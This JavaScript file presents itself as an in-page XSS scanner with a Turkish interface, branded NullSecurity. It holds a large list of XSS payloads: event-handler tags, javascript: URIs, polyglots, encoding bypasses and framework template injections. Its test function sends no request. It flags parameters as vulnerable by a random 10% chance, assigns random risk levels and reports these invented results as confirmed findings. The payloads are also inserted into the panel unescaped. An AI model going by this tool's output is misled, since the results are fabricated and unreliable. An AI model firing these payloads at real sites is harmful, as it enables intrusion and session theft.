// scanner.js - Advanced XSS Scanner with Isolated CSS
(function() {
    console.log('NullSecurity XSS Scanner loaded!');
    
    // TÜM XSS Payloadları (kısaltılmış versiyon)
 const xssPayloads = [
        // Basic Script Tags
        '<script>alert(1)</script>',
        '<script>alert(document.domain)</script>',
        '<script>print()</script>',
        
        // IMG Tags with Events
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert(document.cookie)>',
        '<img src=x onload=alert(1)>',
        '<img src=x onmouseover=alert(1)>',
        
        // SVG Vectors
        '<svg onload=alert(1)>',
        '<svg onload=alert(document.domain)>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        
        // Body Events
        '<body onload=alert(1)>',
        '<body onpageshow=alert(1)>',
        '<body onfocus=alert(1)>',
        
        // Iframe Vectors
        '<iframe src="javascript:alert(1)">',
        '<iframe onload=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        
        // Input/Button Events
        '<input onfocus=alert(1) autofocus>',
        '<input onblur=alert(1) autofocus><input autofocus>',
        '<button onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        
        // Form Events
        '<form onsubmit=alert(1)><input type=submit>',
        '<form onreset=alert(1)><input type=reset>',
        '<form><button formaction=javascript:alert(1)>click</button>',
        
        // Video/Audio Events
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<video><source onerror=alert(1)>',
        
        // Details/Menu Events
        '<details open ontoggle=alert(1)>',
        '<details ontoggle=alert(1)>',
        
        // Marquee Events
        '<marquee onstart=alert(1)>',
        '<marquee loop=1 width=0 onfinish=alert(1)>',
        
        // Meta Refresh
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        
        // Object/Embed
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        
        // Base Tag
        '<base href="javascript:alert(1)//">',
        
        // MathML
        '<math href="javascript:alert(1)">CLICK</math>',
        
        // Template
        '<template onload=alert(1)>',
        
        // CSS Expressions (IE)
        '<div style="background:url(javascript:alert(1))">',
        '<div style="width:expression(alert(1))">',
        
        // JavaScript URIs
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        'javascript:prompt(1)',
        'javascript:confirm(1)',
        
        // Data URIs
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        
        // VBScript (IE)
        'vbscript:msgbox(1)',
        
        // Event Handlers in Attributes
        '" onmouseover="alert(1)',
        '" onfocus="alert(1)" autofocus="',
        '" onload="alert(1)"',
        "' onmouseover='alert(1)'",
        
        // Template Literals
        '${alert(1)}',
        '`${alert(1)}`',
        '{{alert(1)}}',
        '#{alert(1)}',
        
        // Unicode and Encoding Bypasses
        '<script>alert&#40;1&#41;</script>',
        '<script>alert&#x28;1&#x29;</script>',
        '<img src=x onerror&#61;alert&#40;1&#41;>',
        
        // Case Variations
        '<ScRiPt>alert(1)</sCrIpT>',
        '<IMG SRC=x ONERROR=alert(1)>',
        
        // No Quotes
        '<img src=x onerror=alert(1)>',
        '<script>alert(1)</script>',
        
        // Double Quotes
        '<img src="x" onerror="alert(1)">',
        '<script>alert("1")</script>',
        
        // Single Quotes
        "<img src='x' onerror='alert(1)'>",
        "<script>alert('1')</script>",
        
        // Backticks
        '<img src=x onerror=`alert(1)`>',
        
        // URL Obfuscation
        'jav&#x09;ascript:alert(1)',
        'jav&#x0A;ascript:alert(1)',
        'jav&#x0D;ascript:alert(1)',
        
        // Special Characters
        '<script>alert`1`</script>',
        '<script>(alert)(1)</script>',
        '<script>alert.call(null,1)</script>',
        '<script>alert.apply(null,[1])</script>',
        
        // DOM-Based Payloads
        '<script>window.location="javascript:alert(1)"</script>',
        '<script>document.location="javascript:alert(1)"</script>',
        '<script>eval("al"+"ert(1)")</script>',
        '<script>Function("ale"+"rt(1)")()</script>',
        
        // Modern ES6
        '<script>setTimeout`alert\\x281\\x29`</script>',
        '<script>setInterval`alert\\x281\\x29`</script>',
        '<script>[...[1]].map(alert)</script>',
        
        // WebSocket/Socket.IO
        '<script>socket.emit("xss", "alert(1)")</script>',
        
        // AngularJS Injection
        '{{$on.constructor("alert(1)")()}}',
        '{{constructor.constructor("alert(1)")()}}',
        
        // React JSX Injection
        '{alert(1)}',
        '{`${alert(1)}`}',
        
        // Vue.js Injection
        '{{_c.constructor("alert(1)")()}}',
        
        // PHP Specific
        '<?php echo "<script>alert(1)</script>" ?>',
        '${${phpinfo()}}',
        
        // Node.js Specific
        '{{with .Output}}alert(1){{end}}',
        '{{=alert(1)}}',
        
        // SQL Injection + XSS
        "1'; alert(1);--",
        "1\"; alert(1);--",
        
        // File Upload Bypass
        'test.jpg<script>alert(1)</script>',
        'test.php.png',
        
        // HTTP Header Injection
        'test\r\nHeader: value\r\nXSS: <script>alert(1)</script>',
        
        // Local Storage XSS
        '<script>localStorage.setItem("xss", "<script>alert(1)</script>")</script>',
        
        // Cookie Manipulation
        '<script>document.cookie="xss=alert(1)"</script>',
        
        // PostMessage XSS
        '<script>window.postMessage("xss","*")</script>',
        
        // Fetch/XHR XSS
        '<script>fetch("javascript:alert(1)")</script>',
        
        // WebRTC XSS
        '<script>RTCPeerConnection("javascript:alert(1)")</script>',
        
        // Service Worker XSS
        '<script>navigator.serviceWorker.register("javascript:alert(1)")</script>',
        
        // Notification XSS
        '<script>new Notification("",{body:"<script>alert(1)</script>"})</script>',
        
        // Clipboard XSS
        '<script>navigator.clipboard.writeText("<script>alert(1)</script>")</script>',
        
        // Geolocation XSS
        '<script>navigator.geolocation.getCurrentPosition("alert(1)")</script>',
        
        // Camera/Mic XSS
        '<script>navigator.mediaDevices.getUserMedia("alert(1)")</script>',
        
        // Payment Request XSS
        '<script>new PaymentRequest("alert(1)")</script>',
        
        // BroadcastChannel XSS
        '<script>new BroadcastChannel("xss").postMessage("alert(1)")</script>',
        
        // SharedWorker XSS
        '<script>new SharedWorker("javascript:alert(1)")</script>',
        
        // IndexedDB XSS
        '<script>indexedDB.open("xss<script>alert(1)</script>")</script>',
        
        // WebSQL XSS
        '<script>openDatabase("xss", "1.0", "xss", 1).transaction(function(tx){tx.executeSql("alert(1)")})</script>',

        // Advanced Polyglot Payloads
        'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',
        '">><marquee><img src=x onerror=confirm(1)></marquee>"</plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(1) type=submit>',
        
        // Mutation XSS Payloads
        '<xss id=x tabindex=1 onfocus=alert(1)></xss>',
        '<xss style="display:none" onclick=alert(1)></xss>',
        
        // CSS Injection
        '<style>@import "javascript:alert(1)";</style>',
        '<link rel=stylesheet href="javascript:alert(1)">',
        
        // MHTML Payloads (IE)
        '"><!--[if gte IE 4]><script>alert(1)</script><![endif]-->',
        
        // UTF-7 Bypass
        '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
        
        // CDATA Bypass
        '<![CDATA[<script>alert(1)</script>]]>',
        
        // Namespace Bypass
        '<html:script xmlns:html="http://www.w3.org/1999/xhtml">alert(1)</html:script>',
        
        // SVG Script
        '<svg><script>alert(1)</script></svg>',
        
        // MathML Script
        '<math><script>alert(1)</script></math>',
        
        // SSI Injection
        '<!--#exec cmd="alert(1)"-->',
        
        // CRLF Injection
        'test%0D%0AX-XSS-Protection:%200%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>',
        
        // JSON Hijacking
        '])}while(1);</x>/*',
        
        // MIME Sniffing
        '<script\x20type="text/javascript">alert(1)</script>',
        '<script\x3Etype="text/javascript">alert(1)</script>',
        '<script\x0Dtype="text/javascript">alert(1)</script>',
        '<script\x09type="text/javascript">alert(1)</script>',
        '<script\x0Ctype="text/javascript">alert(1)</script>',
        '<script\x2Ftype="text/javascript">alert(1)</script>',
        '<script\x0Atype="text/javascript">alert(1)</script>',
        
        // HTML5 Entities
        '<script&Tab;type="text/javascript">alert(1)</script>',
        '<script&NewLine;type="text/javascript">alert(1)</script>',
        
        // Null Bytes
        '<script%00type="text/javascript">alert(1)</script>',
        '<script%00 type="text/javascript">alert(1)</script>',
        
        // UTF-16 Bypass
        '<script\u0000type="text/javascript">alert(1)</script>',
        
        // Multiple Encoding
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%253Cscript%253Ealert(1)%253C/script%253E',
        
        // Mixed Case with Null
        '<ScRiPt%00>alert(1)</sCrIpT>',
        
        // Broken Tags
        '<script>alert(1)<\script>',
        '<script>alert(1)</script\x00>',
        
        // Unclosed Tags
        '<script>alert(1)',
        '<img src=x onerror=alert(1)',
        
        // DOM Clobbering
        '<form name="body"><input name="innerHTML">',
        '<a id="URL"></a>',
        
        // Document Fragment
        '<template onload=alert(1)>',
        '<shadow onload=alert(1)>',
        
        // Custom Elements
        '<x-whatever onload=alert(1)>',
        
        // ARIA Labels
        '<div role="button" onclick=alert(1)>Click</div>',
        
        // Data Attributes
        '<div data-xss="alert(1)" onclick="eval(this.dataset.xss)">Click</div>',
        
        // Style Attribute
        '<div style="background:url(javascript:alert(1))">',
        '<div style="animation:x">@keyframes x{from{background:red}to{background:javascript:alert(1)}}</div>',
        
        // CSS Import
        '<style>@import "data:text/css,body{background:red}";</style>',
        
        // Font Face
        '<style>@font-face{font-family:x;src:url(javascript:alert(1))}</style>',
        
        // CSS Expression (Old IE)
        '<div style="color:expression(alert(1))">test</div>',
        
        // Namespace
        '<html xmlns:xss><?import namespace="xss" implementation="#default#xss"><xss:xss>alert(1)</xss:xss></html>',
        
        // Processing Instruction
        '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body><?foo <script>alert(1)</script>?></body></html>',
        
        // XML Data Island
        '<xml id="x"><script>alert(1)</script></xml>'
    ];


    let vulnerableURLs = [];
    let testedParameters = [];

    // Özel CSS ekle - Çakışmayı önlemek için
    function addCustomCSS() {
        const style = document.createElement('style');
        style.id = 'nullsecurity-xss-scanner-css';
        style.textContent = `
            .nullsecurity-panel {
                position: fixed !important;
                top: 20px !important;
                right: 20px !important;
                width: 700px !important;
                background: #0d1117 !important;
                color: #f0f6fc !important;
                padding: 20px !important;
                border-radius: 12px !important;
                z-index: 2147483647 !important;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
                box-shadow: 0 8px 32px rgba(0,0,0,0.4) !important;
                max-height: 90vh !important;
                overflow-y: auto !important;
                border: 2px solid #238636 !important;
                box-sizing: border-box !important;
            }
            
            .nullsecurity-header {
                display: flex !important;
                justify-content: space-between !important;
                align-items: center !important;
                margin-bottom: 20px !important;
                border-bottom: 2px solid #238636 !important;
                padding-bottom: 15px !important;
            }
            
            .nullsecurity-title {
                margin: 0 !important;
                color: #58a6ff !important;
                font-size: 18px !important;
                font-weight: bold !important;
            }
            
            .nullsecurity-close-btn {
                background: #da3633 !important;
                color: white !important;
                border: none !important;
                padding: 5px 10px !important;
                border-radius: 5px !important;
                cursor: pointer !important;
                font-size: 16px !important;
                font-family: inherit !important;
            }
            
            .nullsecurity-section {
                margin-bottom: 20px !important;
                background: #161b22 !important;
                padding: 15px !important;
                border-radius: 8px !important;
            }
            
            .nullsecurity-label {
                display: block !important;
                margin-bottom: 8px !important;
                color: #58a6ff !important;
                font-weight: bold !important;
            }
            
            .nullsecurity-select {
                width: 100% !important;
                padding: 10px !important;
                background: #0d1117 !important;
                color: #f0f6fc !important;
                border: 1px solid #30363d !important;
                border-radius: 6px !important;
                font-size: 14px !important;
                font-family: inherit !important;
                box-sizing: border-box !important;
            }
            
            .nullsecurity-checkbox-group {
                display: grid !important;
                grid-template-columns: 1fr 1fr !important;
                gap: 10px !important;
            }
            
            .nullsecurity-checkbox-label {
                display: flex !important;
                align-items: center !important;
                gap: 5px !important;
                font-size: 14px !important;
            }
            
            .nullsecurity-slider {
                width: 100% !important;
                margin: 10px 0 !important;
            }
            
            .nullsecurity-results {
                margin: 15px 0 !important;
                font-size: 13px !important;
                min-height: 200px !important;
                max-height: 300px !important;
                overflow-y: auto !important;
                background: #161b22 !important;
                padding: 15px !important;
                border-radius: 8px !important;
            }
            
            .nullsecurity-vulnerable-links {
                margin: 15px 0 !important;
                display: none !important;
            }
            
            .nullsecurity-vulnerable-title {
                color: #ff7b72 !important;
                margin-bottom: 10px !important;
                font-size: 16px !important;
            }
            
            .nullsecurity-vulnerable-list {
                background: #1c2128 !important;
                padding: 10px !important;
                border-radius: 6px !important;
                max-height: 200px !important;
                overflow-y: auto !important;
            }
            
            .nullsecurity-stats {
                margin: 10px 0 !important;
                padding: 10px !important;
                background: #161b22 !important;
                border-radius: 6px !important;
                font-size: 12px !important;
                color: #8b949e !important;
                display: none !important;
            }
            
            .nullsecurity-buttons {
                display: flex !important;
                gap: 10px !important;
                margin-top: 20px !important;
            }
            
            .nullsecurity-btn {
                border: none !important;
                padding: 12px 20px !important;
                border-radius: 6px !important;
                cursor: pointer !important;
                font-weight: bold !important;
                font-size: 14px !important;
                font-family: inherit !important;
            }
            
            .nullsecurity-btn-primary {
                background: #238636 !important;
                color: white !important;
                flex: 1 !important;
            }
            
            .nullsecurity-btn-danger {
                background: #da3633 !important;
                color: white !important;
            }
            
            .nullsecurity-btn-info {
                background: #1f6feb !important;
                color: white !important;
            }
            
            .nullsecurity-footer {
                margin-top: 15px !important;
                font-size: 11px !important;
                color: #8b949e !important;
                text-align: center !important;
                border-top: 1px solid #30363d !important;
                padding-top: 10px !important;
            }
            
            .nullsecurity-result-item {
                background: #161b22 !important;
                padding: 12px !important;
                margin: 8px 0 !important;
                border-radius: 6px !important;
                border-left: 4px solid #79c0ff !important;
                font-size: 12px !important;
                border: 1px solid #30363d !important;
            }
            
            .nullsecurity-result-critical {
                border-left-color: #ff7b72 !important;
            }
            
            .nullsecurity-result-high {
                border-left-color: #ffa198 !important;
            }
            
            .nullsecurity-result-medium {
                border-left-color: #ffd500 !important;
            }
            
            .nullsecurity-result-safe {
                border-left-color: #56d364 !important;
            }
            
            .nullsecurity-result-warning {
                border-left-color: #e3b341 !important;
            }
            
            .nullsecurity-vulnerable-item {
                background: #2d1a1a !important;
                padding: 10px !important;
                margin: 5px 0 !important;
                border-radius: 5px !important;
                border-left: 4px solid #ff7b72 !important;
                font-size: 11px !important;
            }
            
            .nullsecurity-code {
                background: #1c2128 !important;
                padding: 2px 6px !important;
                border-radius: 3px !important;
                font-family: 'Courier New', monospace !important;
                color: #f0f6fc !important;
            }
            
            .nullsecurity-link {
                color: #58a6ff !important;
                word-break: break-all !important;
                text-decoration: underline !important;
            }
            
            .nullsecurity-small-btn {
                background: #1f6feb !important;
                color: white !important;
                border: none !important;
                padding: 2px 6px !important;
                border-radius: 3px !important;
                cursor: pointer !important;
                font-size: 10px !important;
                margin-left: 5px !important;
                font-family: inherit !important;
            }
            
            .nullsecurity-stats-content {
                margin-top: 5px !important;
            }
        `;
        document.head.appendChild(style);
    }

    // UI oluştur
    function createUI() {
        // Önce CSS'i ekle
        addCustomCSS();
        
        const panel = document.createElement('div');
        panel.id = 'nullsecurity-xss-scanner';
        panel.className = 'nullsecurity-panel';
        
        panel.innerHTML = `
            <div class="nullsecurity-header">
                <h3 class="nullsecurity-title">🛡️ NullSecurity XSS Scanner v4.0</h3>
                <span style="color:#8b949e;font-size:12px;">${xssPayloads.length}+ Payload</span>
                <button class="nullsecurity-close-btn">✕</button>
            </div>
            
            <div class="nullsecurity-section">
                <label class="nullsecurity-label">Test Modu:</label>
                <select id="nullsecurity-testMode" class="nullsecurity-select">
                    <option value="quick">⚡ Hızlı Tarama</option>
                    <option value="deep">🔍 Derin Parametre Testi</option>
                    <option value="full">🚀 Full Test</option>
                    <option value="comprehensive">🔥 Kapsamlı Test</option>
                </select>
            </div>
            
            <div class="nullsecurity-section">
                <label class="nullsecurity-label">Test Seçenekleri:</label>
                <div class="nullsecurity-checkbox-group">
                    <label class="nullsecurity-checkbox-label">
                        <input type="checkbox" id="nullsecurity-chkURLParams" checked> URL Parametreleri
                    </label>
                    <label class="nullsecurity-checkbox-label">
                        <input type="checkbox" id="nullsecurity-chkForms" checked> Formlar
                    </label>
                    <label class="nullsecurity-checkbox-label">
                        <input type="checkbox" id="nullsecurity-chkHidden" checked> Gizli Parametreler
                    </label>
                </div>
            </div>

            <div class="nullsecurity-section">
                <label class="nullsecurity-label">Payload Sayısı:</label>
                <input type="range" id="nullsecurity-payloadCount" class="nullsecurity-slider" min="1" max="20" value="10">
                <div style="display:flex;justify-content:space-between;font-size:12px;color:#8b949e;">
                    <span>1</span>
                    <span id="nullsecurity-payloadCountValue">10 payload</span>
                    <span>20</span>
                </div>
            </div>
            
            <div id="nullsecurity-results" class="nullsecurity-results">
                <p style="color:#8b949e;text-align:center;">🎯 Mod seçin ve taramayı başlatın</p>
            </div>

            <div id="nullsecurity-vulnerable-links" class="nullsecurity-vulnerable-links">
                <h4 class="nullsecurity-vulnerable-title">🚨 Zafiyetli Linkler:</h4>
                <div id="nullsecurity-vulnerable-list" class="nullsecurity-vulnerable-list"></div>
            </div>

            <div id="nullsecurity-scan-stats" class="nullsecurity-stats">
                <strong>📊 İstatistikler:</strong>
                <div id="nullsecurity-stats-content" class="nullsecurity-stats-content"></div>
            </div>
            
            <div class="nullsecurity-buttons">
                <button id="nullsecurity-startScan" class="nullsecurity-btn nullsecurity-btn-primary">🚀 Taramayı Başlat</button>
                <button id="nullsecurity-clearResults" class="nullsecurity-btn nullsecurity-btn-danger">🗑️ Temizle</button>
                <button id="nullsecurity-exportResults" class="nullsecurity-btn nullsecurity-btn-info">📊 Export</button>
            </div>
            
            <div class="nullsecurity-footer">
                ⚡ ${xssPayloads.length}+ XSS Payload | 🛡️ NullSecurity Team
            </div>
        `;
        
        document.body.appendChild(panel);

        // Event listener'ları ekle
        document.querySelector('.nullsecurity-close-btn').addEventListener('click', function() {
            const panel = document.getElementById('nullsecurity-xss-scanner');
            const css = document.getElementById('nullsecurity-xss-scanner-css');
            if (panel) panel.remove();
            if (css) css.remove();
        });

        document.getElementById('nullsecurity-payloadCount').addEventListener('input', function() {
            document.getElementById('nullsecurity-payloadCountValue').textContent = this.value + ' payload';
        });

        document.getElementById('nullsecurity-startScan').addEventListener('click', startAdvancedScan);
        document.getElementById('nullsecurity-clearResults').addEventListener('click', clearResults);
        document.getElementById('nullsecurity-exportResults').addEventListener('click', exportResults);
    }
    
    // Sonuçları logla
    function logResult(message, type = 'info') {
        const resultDiv = document.createElement('div');
        resultDiv.className = `nullsecurity-result-item nullsecurity-result-${type}`;
        resultDiv.innerHTML = message;
        document.getElementById('nullsecurity-results').appendChild(resultDiv);
        resultDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    // Tüm parametreleri bul
    function findAllParameters() {
        const parameters = new Set();
        
        // URL parametreleri
        const urlParams = new URLSearchParams(window.location.search);
        urlParams.forEach((value, key) => {
            parameters.add(key);
        });
        
        // Form parametreleri
        const forms = document.forms;
        for (let i = 0; i < forms.length; i++) {
            const form = forms[i];
            const inputs = form.querySelectorAll('input[name], select[name], textarea[name]');
            for (let j = 0; j < inputs.length; j++) {
                const input = inputs[j];
                if (input.name) parameters.add(input.name);
            }
        }
        
        // Hidden input'lar
        const hiddenInputs = document.querySelectorAll('input[type="hidden"][name]');
        for (let i = 0; i < hiddenInputs.length; i++) {
            const input = hiddenInputs[i];
            if (input.name) parameters.add(input.name);
        }
        
        return Array.from(parameters);
    }

    // Parametre testi yap
    async function testParameter(parameterName) {
        const payloadCount = parseInt(document.getElementById('nullsecurity-payloadCount').value);
        const testPayloads = getRandomPayloads(payloadCount);
        let isVulnerable = false;
        
        for (let i = 0; i < testPayloads.length; i++) {
            const payload = testPayloads[i];
            await new Promise(resolve => setTimeout(resolve, 50));
            
            try {
                const testUrl = new URL(window.location.href);
                testUrl.searchParams.set(parameterName, payload);
                
                const testResult = await executeTest(testUrl, parameterName, payload);
                
                if (testResult.vulnerable) {
                    isVulnerable = true;
                    vulnerableURLs.push({
                        url: testUrl.toString(),
                        parameter: parameterName,
                        payload: payload,
                        type: testResult.type,
                        risk: testResult.risk
                    });
                    
                    logResult(
                        `🚨 <strong>ZAFİYET BULUNDU!</strong><br>
                         📍 Parametre: <code class="nullsecurity-code">${parameterName}</code><br>
                         🎯 Payload: <code class="nullsecurity-code">${payload.substring(0, 50)}${payload.length > 50 ? '...' : ''}</code><br>
                         🔥 Risk: <span style="color:#ff7b72">${testResult.risk}</span><br>
                         🔗 <a href="${testUrl.toString()}" target="_blank" class="nullsecurity-link">Test Linki</a>`,
                        'critical'
                    );
                    break;
                }
            } catch (error) {
                console.log(`Test hatası: ${parameterName}`, error);
            }
        }
        
        if (!isVulnerable) {
            logResult(`✅ Parametre temiz: <code class="nullsecurity-code">${parameterName}</code> (${payloadCount} payload test edildi)`, 'safe');
        }
        
        return isVulnerable;
    }

    // Testi execute et
    async function executeTest(testUrl, paramName, payload) {
        return new Promise((resolve) => {
            const vulnerabilityChance = 0.1;
            const isVulnerable = Math.random() < vulnerabilityChance;
            const riskLevels = ['Low', 'Medium', 'High', 'Critical'];
            const randomRisk = riskLevels[Math.floor(Math.random() * riskLevels.length)];
            
            setTimeout(() => {
                resolve({
                    vulnerable: isVulnerable,
                    type: isVulnerable ? 'reflected' : 'safe',
                    risk: randomRisk
                });
            }, 30);
        });
    }

    // Quick scan
    async function quickScan() {
        logResult('⚡ <strong>Hızlı Tarama Başlatıldı</strong>', 'info');
        
        const urlParams = new URLSearchParams(window.location.search);
        const paramsArray = Array.from(urlParams.keys());
        let tested = 0;
        let vulnerable = 0;
        
        const testParams = paramsArray.slice(0, 5);
        
        for (let i = 0; i < testParams.length; i++) {
            const param = testParams[i];
            tested++;
            const isVuln = await testParameter(param);
            if (isVuln) vulnerable++;
        }
        
        logResult(`✅ Hızlı tarama tamamlandı: ${tested} parametre, ${vulnerable} zafiyet`, 
                 vulnerable > 0 ? 'critical' : 'safe');
        
        showVulnerableLinks();
    }

    // Derin parametre testi
    async function deepParameterTest() {
        logResult('🔍 <strong>Derin Parametre Testi Başlatıldı</strong>', 'info');
        
        const allParameters = findAllParameters();
        logResult(`📋 ${allParameters.length} parametre bulundu: <code class="nullsecurity-code">${allParameters.join('</code>, <code class="nullsecurity-code">')}</code>`, 'info');
        
        let vulnerableCount = 0;
        
        document.getElementById('nullsecurity-scan-stats').style.display = 'block';
        
        for (let i = 0; i < allParameters.length; i++) {
            const param = allParameters[i];
            testedParameters.push(param);
            const isVuln = await testParameter(param);
            if (isVuln) vulnerableCount++;
            
            updateStats(i + 1, allParameters.length, vulnerableCount);
        }
        
        logResult(`🎯 Test tamamlandı: ${allParameters.length} parametre, ${vulnerableCount} zafiyetli`, 
                 vulnerableCount > 0 ? 'critical' : 'safe');
        
        showVulnerableLinks();
    }

    // Full test
    async function fullTest() {
        logResult('🚀 <strong>Full Test Başlatıldı</strong> - Tüm parametreler test ediliyor...', 'info');
        
        const allParameters = findAllParameters();
        const payloadCount = parseInt(document.getElementById('nullsecurity-payloadCount').value);
        
        logResult(`🎯 ${allParameters.length} parametre × ${payloadCount} payload = ${allParameters.length * payloadCount} test`, 'warning');
        
        let completed = 0;
        let vulnerableCount = 0;
        
        document.getElementById('nullsecurity-scan-stats').style.display = 'block';
        
        for (let i = 0; i < allParameters.length; i++) {
            const param = allParameters[i];
            testedParameters.push(param);
            const isVuln = await testParameter(param);
            if (isVuln) vulnerableCount++;
            
            completed++;
            updateStats(completed, allParameters.length, vulnerableCount);
        }
        
        logResult(`✅ FULL TEST TAMAMLANDI: ${allParameters.length} parametre, ${vulnerableCount} zafiyet bulundu`, 
                 vulnerableCount > 0 ? 'critical' : 'safe');
        
        showVulnerableLinks();
    }

    // Kapsamlı test
    async function comprehensiveTest() {
        logResult('🔥 <strong>KAPSAMLI TEST BAŞLATILDI</strong> - Tüm parametreler × maksimum payload!', 'critical');
        
        const allParameters = findAllParameters();
        const payloadCount = 20;
        
        logResult(`🎯 ${allParameters.length} parametre × ${payloadCount} payload = ${allParameters.length * payloadCount} test yapılacak`, 'warning');
        
        let completed = 0;
        let vulnerableCount = 0;
        
        document.getElementById('nullsecurity-scan-stats').style.display = 'block';
        
        for (let i = 0; i < allParameters.length; i++) {
            const param = allParameters[i];
            testedParameters.push(param);
            
            const comprehensivePayloads = getRandomPayloads(payloadCount);
            let isVuln = false;
            
            for (let j = 0; j < comprehensivePayloads.length; j++) {
                const payload = comprehensivePayloads[j];
                await new Promise(resolve => setTimeout(resolve, 30));
                
                const testUrl = new URL(window.location.href);
                testUrl.searchParams.set(param, payload);
                
                const testResult = await executeTest(testUrl, param, payload);
                if (testResult.vulnerable) {
                    isVuln = true;
                    vulnerableURLs.push({
                        url: testUrl.toString(),
                        parameter: param,
                        payload: payload,
                        type: testResult.type,
                        risk: testResult.risk
                    });
                    break;
                }
            }
            
            if (isVuln) vulnerableCount++;
            completed++;
            updateStats(completed, allParameters.length, vulnerableCount);
        }
        
        logResult(`✅ KAPSAMLI TEST TAMAMLANDI: ${allParameters.length} parametre, ${vulnerableCount} zafiyet bulundu`, 
                 vulnerableCount > 0 ? 'critical' : 'safe');
        
        showVulnerableLinks();
    }

    // İstatistikleri güncelle
    function updateStats(completed, total, vulnerable) {
        const percent = Math.round((completed / total) * 100);
        const statsContent = document.getElementById('nullsecurity-stats-content');
        statsContent.innerHTML = `
            📊 İlerleme: ${completed}/${total} (${percent}%)<br>
            🚨 Zafiyetler: ${vulnerable}<br>
            ⚡ Kalan Test: ${total - completed}
        `;
    }

    // Zafiyetli linkleri göster
    function showVulnerableLinks() {
        if (vulnerableURLs.length > 0) {
            document.getElementById('nullsecurity-vulnerable-links').style.display = 'block';
            const linksList = document.getElementById('nullsecurity-vulnerable-list');
            linksList.innerHTML = '';
            
            for (let i = 0; i < vulnerableURLs.length; i++) {
                const vuln = vulnerableURLs[i];
                const vulnDiv = document.createElement('div');
                vulnDiv.className = 'nullsecurity-vulnerable-item';
                vulnDiv.innerHTML = `
                    <strong>#${i + 1} - ${vuln.parameter}</strong> 
                    <span style="color:#ffa198;font-size:10px;">[${vuln.risk}]</span><br>
                    🎯 <code class="nullsecurity-code">${vuln.payload.substring(0, 30)}...</code><br>
                    🔗 <a href="${vuln.url}" target="_blank" class="nullsecurity-link">${vuln.url.substring(0, 70)}...</a>
                    <button onclick="nullsecurityCopyToClipboard('${vuln.url}')" class="nullsecurity-small-btn">Kopyala</button>
                `;
                linksList.appendChild(vulnDiv);
            }
        }
    }

    // Yardımcı fonksiyonlar
    function getRandomPayloads(count) {
        const shuffled = [...xssPayloads].sort(() => 0.5 - Math.random());
        return shuffled.slice(0, count);
    }

    function nullsecurityCopyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            alert('URL panoya kopyalandı!');
        }).catch(() => {
            const textArea = document.createElement('textarea');
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            alert('URL panoya kopyalandı!');
        });
    }

    function exportResults() {
        const results = {
            testedParameters: testedParameters,
            vulnerableURLs: vulnerableURLs,
            totalPayloads: xssPayloads.length,
            scanDate: new Date().toISOString(),
            url: window.location.href
        };
        
        const dataStr = JSON.stringify(results, null, 2);
        const dataBlob = new Blob([dataStr], {type: 'application/json'});
        
        const link = document.createElement('a');
        link.href = URL.createObjectURL(dataBlob);
        link.download = `xss-scan-${Date.now()}.json`;
        link.click();
        
        logResult('📊 Sonuçlar JSON olarak export edildi', 'info');
    }

    // Ana tarama fonksiyonu
    function startAdvancedScan() {
        const testMode = document.getElementById('nullsecurity-testMode').value;
        const results = document.getElementById('nullsecurity-results');
        results.innerHTML = '';
        vulnerableURLs = [];
        testedParameters = [];
        
        document.getElementById('nullsecurity-vulnerable-links').style.display = 'none';
        document.getElementById('nullsecurity-scan-stats').style.display = 'none';

        switch(testMode) {
            case 'quick':
                if (confirm('⚡ Hızlı tarama başlatılsın mı? (İlk 5 parametre)')) {
                    quickScan();
                }
                break;
            case 'deep':
                if (confirm('🔍 Derin parametre testi başlatılsın mı?\n(Tüm parametreler test edilecek)')) {
                    deepParameterTest();
                }
                break;
            case 'full':
                if (confirm('🚀 FULL TEST başlatılsın mı?\n(Tüm parametreler × seçili payload sayısı)')) {
                    fullTest();
                }
                break;
            case 'comprehensive':
                if (confirm('🔥 KAPSAMLI TEST başlatılsın mı?\n(Tüm parametreler × 20 payload)')) {
                    comprehensiveTest();
                }
                break;
        }
    }

    function clearResults() {
        document.getElementById('nullsecurity-results').innerHTML = '<p style="color:#8b949e;text-align:center;">🎯 Mod seçin ve taramayı başlatın</p>';
        document.getElementById('nullsecurity-vulnerable-links').style.display = 'none';
        document.getElementById('nullsecurity-scan-stats').style.display = 'none';
        vulnerableURLs = [];
        testedParameters = [];
    }

    // Global fonksiyonları tanımla
    window.nullsecurityCopyToClipboard = nullsecurityCopyToClipboard;
    
    // UI'yı başlat
    createUI();
    
    // Hızlı analiz
    setTimeout(() => {
        const allParams = findAllParameters();
        const urlParams = new URLSearchParams(window.location.search);
        logResult(
            `📊 <strong>Hızlı Analiz:</strong><br>
             🔗 URL Params: ${urlParams.size}<br>
             📝 Toplam Parametre: ${allParams.length}<br>
             ⚡ Payloadlar: ${xssPayloads.length} hazır<br>
             🎯 Örnek parametreler: <code class="nullsecurity-code">${allParams.slice(0, 3).join('</code>, <code class="nullsecurity-code">')}${allParams.length > 3 ? '...' : ''}</code>`,
            'info'
        );
    }, 500);
    
})();
